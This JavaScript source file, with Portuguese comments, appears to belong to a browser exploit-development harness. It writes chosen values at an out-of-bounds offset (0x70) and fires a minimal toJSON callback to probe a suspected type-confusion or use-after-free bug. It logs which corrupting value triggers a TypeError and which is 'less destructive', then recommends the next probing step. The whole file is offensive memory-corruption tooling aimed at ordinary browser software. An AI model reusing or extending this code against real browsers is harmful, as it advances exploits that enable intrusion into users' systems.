// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; // Importado para OOB_CONFIG.BASE_OFFSET_IN_DV
import { toHex } from '../utils.mjs';     // Importado para logging de offsets

// --- Função toJSON Minimalista para Testar o Gatilho do TypeError ---
// Esta versão foca no incremento do contador, que foi o primeiro gatilho do TypeError
// no teste Decomp_V1_CounterOnly.
function toJSON_MinimalTriggerForCrash() {
    current_toJSON_call_count_for_TypeError_test++; // Operação suspeita de causar o TypeError
    // document.title = `toJSON_MinimalTrigger Call ${current_toJSON_call_count_for_TypeError_test}`; // Mantenha comentado inicialmente
    return { minimal_trigger_call: current_toJSON_call_count_for_TypeError_test };
}


async function runDestructiveAndLessDestructiveTests() {
    const FNAME_RUNNER = "runDestructiveAndLessDestructiveTests";
    logS3(`==== INICIANDO Testes Destrutivo e Menos Destrutivo para TypeError ====`, 'test', FNAME_RUNNER);

    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    // Teste 1: Confirmar Comportamento Destrutivo com 0xFFFFFFFF
    logS3(`\n--- Teste 1: Valor Destrutivo (0xFFFFFFFF) em ${toHex(criticalOffset)} ---`, 'subtest', FNAME_RUNNER);
    let result1 = await executeFocusedTestForTypeError(
        "DestructiveTest_0xFFFFFFFF_at_0x70",
        toJSON_MinimalTriggerForCrash,
        0xFFFFFFFF
    );
    if (result1.errorOccurred && result1.errorOccurred.name === 'TypeError') {
        logS3(`   CONFIRMADO: ${result1.errorOccurred.name} ocorreu como esperado.`, "vuln", FNAME_RUNNER);
    } else if (result1.errorOccurred) {
        logS3(`   INESPERADO: Outro erro ocorreu: ${result1.errorOccurred.name} - ${result1.errorOccurred.message}`, "warn", FNAME_RUNNER);
    } else if (result1.potentiallyCrashed) {
        logS3(`   INESPERADO: Teste pode ter congelado.`, "error", FNAME_RUNNER);
    } else {
        logS3(`   INESPERADO: Teste completou sem o TypeError esperado. Chamadas toJSON: ${result1.calls}`, "warn", FNAME_RUNNER);
    }
    logS3(`   Título da página ao final de Teste 1: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);


    // Teste 2: Tentar Valor Menos Destrutivo (0x00000000) em 0x70
    logS3(`\n--- Teste 2: Valor Menos Destrutivo (0x00000000) em ${toHex(criticalOffset)} ---`, 'subtest', FNAME_RUNNER);
    let result2 = await executeFocusedTestForTypeError(
        "LessDestructiveTest_0x00000000_at_0x70",
        toJSON_MinimalTriggerForCrash, // Usa a mesma toJSON minimalista
        0x00000000
    );

    if (result2.errorOccurred && result2.errorOccurred.name === 'TypeError') {
        logS3(`   INESPERADO: ${result2.errorOccurred.name} ocorreu com 0x00000000.`, "warn", FNAME_RUNNER);
    } else if (result2.errorOccurred) {
        logS3(`   INESPERADO: Outro erro ocorreu com 0x00000000: ${result2.errorOccurred.name} - ${result2.errorOccurred.message}`, "warn", FNAME_RUNNER);
    } else if (result2.potentiallyCrashed) {
        logS3(`   INESPERADO: Teste com 0x00000000 pode ter congelado.`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ESPERADO (OU OK): Teste com 0x00000000 completou sem TypeError. Chamadas toJSON: ${result2.calls}`, result2.calls > 0 ? "good" : "info", FNAME_RUNNER);
    }
    logS3(`   Título da página ao final de Teste 2: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Testes Destrutivo e Menos Destrutivo CONCLUÍDOS ====`, 'test', FNAME_RUNNER);

    // Instrução para o próximo passo baseado nos resultados
    if (result1.errorOccurred?.name === 'TypeError' && !result2.errorOccurred && !result2.potentiallyCrashed && result2.calls > 0) {
        logS3(`\nPRÓXIMO PASSO RECOMENDADO: O valor 0x00000000 parece ser "menos destrutivo".`, "good", FNAME_RUNNER);
        logS3(`   Considere usar 0x00000000 com a 'detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice' para sondagem.`, "info", FNAME_RUNNER);
    } else if (result1.errorOccurred?.name === 'TypeError' && result2.errorOccurred?.name === 'TypeError') {
        logS3(`\nAVISO: Ambos os valores (0xFFFFFFFF e 0x00000000) causaram TypeError. A corrupção em 0x70 é muito sensível.`, "warn", FNAME_RUNNER);
    } else {
        logS3(`\nREVISAR RESULTADOS: O comportamento foi inesperado. Verifique os logs detalhadamente.`, "info", FNAME_RUNNER);
    }
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_DestructiveThenLessDestructive';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes Destrutivo e Menos Destrutivo para TypeError ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Teste Destrutivo/Menos Destrutivo";
    
    await runDestructiveAndLessDestructiveTests();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Testes Destrutivo e Menos Destrutivo para TypeError) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    // Ajuste final do título
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter título
    } else {
        document.title = "Script 3 Concluído - D/LD Test";
    }
}
